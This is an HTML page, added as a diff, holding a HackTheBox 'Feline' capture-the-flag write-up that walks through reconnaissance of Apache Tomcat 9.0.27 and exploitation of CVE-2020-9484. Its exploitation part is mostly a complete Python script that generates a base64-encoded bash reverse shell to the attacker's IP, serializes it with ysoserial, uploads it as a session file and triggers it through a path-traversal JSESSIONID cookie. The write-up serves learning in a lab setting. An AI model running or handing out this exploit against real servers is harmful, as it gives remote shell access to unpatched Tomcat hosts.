@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+
+<style>
+body {
+
+	background-image: url('images/cool-background.png');
+	background-attachment: fixed;
+	color: #333;
+}
+</style>
+
+<head>
+<title>HackTheBox Feline Writeup </title>
+<!-- link to main stylesheet -->
+<link rel="stylesheet" type="css/main.css">
+</head>
+
+<body>
+<div class="container">
+ <div class="blurb">
+ <h1>HTB Feline</h1>
+ <p>
+ 	<img src="images/feline/feline.PNG" alt="feline" class="inline"/> 																																																																		<br/> <br/> <br/> <br/>
+
+	 <h2><i>RECON</i></h2>																																																																																								<br/> <br/>
+
+	 We start out with the usual nmap scan 																																																																																<br/> <br/>
+	<img src="images/feline/nmap.PNG" alt="nmap" class="inline"/> 																																																																				<br/> <br/> <br/>
+
+	 The host is running apache tomcat 9.0.27 which is quite old, according to the apache site this was released back in 2019.																																						<br/>
+	 The site is a mostly dead install with dummy links, but there is a VirusBucket section to upload file samples																																												<br/> <br/>
+	 <img src="images/feline/web-server.PNG" alt="web page" class="inline"/> 																																																															<br/> <br/> <br/>
+
+	 I uploaded a sample to checkout the request in burp																																																																									<br/> <br/>
+	 <img src="images/feline/burp-upload.PNG" alt="burpsuite upload request" class="inline"/> 																																																						<br/> <br/> <br/>
+
+	 The site is passing the email and filename through variables, and passing the file as an image. We can also see that the requests are sent to /upload.jsp to be evaluated.														<br/>
+	 Some digging into tomcat 9.0.27 revealed this is potentially vulnerable to a deserialization attack (CVE-2020-9484)																																									<br/> <br/>
+	 <img src="images/feline/apache-vuln.PNG" alt="tomcat vuln" class="inline"/> 																																																													<br/> <br/> <br/>
+
+	 <a href="https://github.com/masahiro331/CVE-2020-9484">There is a poc linked in several of the cve info pages (CVE-2020-9484)</a> 																																		<br/> <br/>
+
+	 I attempted to run this, I was able to succesfully upload the groovy session, but unable to trigger the stack traceback. 																																						<br/> <br/>
+	 <img src="images/feline/user-1st-try.PNG" alt="POC exploit" class="inline"/> 																																																												<br/> <br/> <br/>
+
+	 This could be caused by an invalid upload path. The POC shows the default upload path to be <b>/usr/local/tomcat/</b> though we have not confirmed this on our instance. 														<br/>
+	 I started testing funky characters on the upload endpoint and discovered after passing an empty filename, I was able to trigger a stack traceback that revealed the upload path to us.								<br/> <br/> <br/>
+	 <img src="images/feline/upload-location.PNG" alt="POC exploit" class="inline"/> 																																																											<br/> <br/> <br/>
+
+	 Now we can try to rerun the earlier POC exploit with our updated path <b>(/opt/samples/uploads/)</b>. We are able to see the full stack traceback as expected, thus confirming the vulnerability.		<br/> <br/>
+	 <img src="images/feline/poc-confirmed.PNG" alt="POC exploit" class="inline"/> 																																																												<br/> <br/> <br/> <br/> <br/> <br/>
+
+	 <h3><i>EXPLOITATION</i></h3>																																																																																					<br/> <br/>
+	 So far we have confirmed our target is vulnerable to <b>CVE-2020-9484</b>, and we are able to successfully trigger a stack traceback attempting to execute our file.																	<br/> <br/>
+
+	 Since this is a vulnerability centered around insecure java deserialization, we will now need to serialize our payload. Some digging around google revealed YSoSerial to be the most popular tool.		<br/>
+	 The exploitation examples for YSoSerial all followed the same format, generate a bash payload, serialize the payload with YSoSerial, and shoot it at the server (usually through burpsuite).					<br/> <br/>
+
+	 From here we need to do a couple things:
+	 <ol>
+		 <li> Generate a bash rev shell one liner 						    																</li>
+		 <li> Use YSoSerial to serialize our command and create the .session file           	    </li>
+		 <li> Start up a nc listener								    																					</li>
+		 <li> Curl command to upload our new .session file		    			    											</li>
+		 <li> Curl command to execute our new .session file		    			    											</li>
+		 <li> Interact with our nc listener							    																			</li>
+	 </ol>
+
+	 Let's generate our rev shell command and try to enocode with YSoSerial. I started out with a simple bash one liner.																																									<br/> <br/>
+	 <img src="images/feline/bash-one-liner.PNG" alt="bash one liner" class="inline"/> 																																																										<br/> <br/> <br/>
+
+	 Now to run complex commands involving piping in java, the arguments need to be a string Array. This presents problems for us as our command is fairly complex. 																			<br/>
+	 Basically, our bash command will run and the arguments will run as seperate commands, which is not what we want. So we need to create a string array with our bash command. 													<br/> <br/>
+
+	 <a href="http://jackson-t.ca/runtime-exec-payloads.html">I found a cool site here which formats your JRE payload for you</a>																																					<br/> <br/>
+	 <img src="images/feline/jre-payload.PNG" alt="JRE payload" class="inline"/> 																																																													<br/> <br/> <br/>
+
+	 From here we have all the pieces we need to create a python script to exploit.																																																												<br/> <br/> <br/>
+	 <img src="images/feline/user-txt.PNG" alt="User.txt" class="inline"/>
+
+<h4><i>User.py</i></h4>
+<pre>
+#!/usr/bin/python3
+
+import base64, random
+import netifaces as ni
+from pwn import *
+from termcolor import colored
+
+ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
+upload_url = 'http://feline.htb:8080/upload.jsp'
+
+def main():
+
+    # Set IP, Port, and filename
+    (my_ip, my_port, fname) = get_vars()
+    print(colored('\n[+] Setting exploit info\n\t my_ip = ' + my_ip +'\n\t my_port = ' + my_port + '\n', 'red'))
+
+    # Create our .session file with JRE command from -- http://jackson-t.ca/runtime-exec-payloads.html
+    cmd = base64.b64encode(bytes('bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1', 'utf-8')).decode('ascii')
+    jre_cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'
+    serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
+    run_bash(serialize_cmd)
+
+    # Attempt to upload payload
+    cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null'
+    run_bash(cmd)
+
+    # Startup pwntools listener
+    print(colored('Starting nc listener', 'green'))
+    l = listen(my_port)
+    print(colored('[+] Success', 'green'))
+
+    # Execute payload
+    cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
+    run_bash(cmd)
+
+    # Interact with our listener
+    print(colored('\nInteracting with low priv shell...', 'red'))
+    l.interactive()
+
+
+
+# Set the following variables
+#   my_ip   -> HTB tun0 IP
+#   my_port -> random port between 9000-9500
+#   fname   -> random 6 letter filename
+def get_vars():
+    ni.ifaddresses('tun0')
+    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+    port = random.randrange(9000, 9500, 1)
+    letters = string.ascii_lowercase
+    fname = ''.join(random.choice(letters) for i in range(6))
+    return (str(ip), str(port), str(fname))
+
+
+# Helper func to generate random filename
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
+
+
+# Helper func to run bash commands in a pwntools process
+def run_bash(cmd):
+    print(colored('\n' + str(cmd), 'green'))
+    p = process(cmd, shell=True)
+    err = p.recvall()
+    exit_code = p.poll()
+    if exit_code == 0:
+        print(colored('[+] Success', 'green'))
+        print('\n')
+    else:
+        print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
+
+
+main()
+
+</pre>
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+</div><!-- /.blurb -->
+<div class="blurb">
+</div><!-- /.container -->
+</body>
+</html>
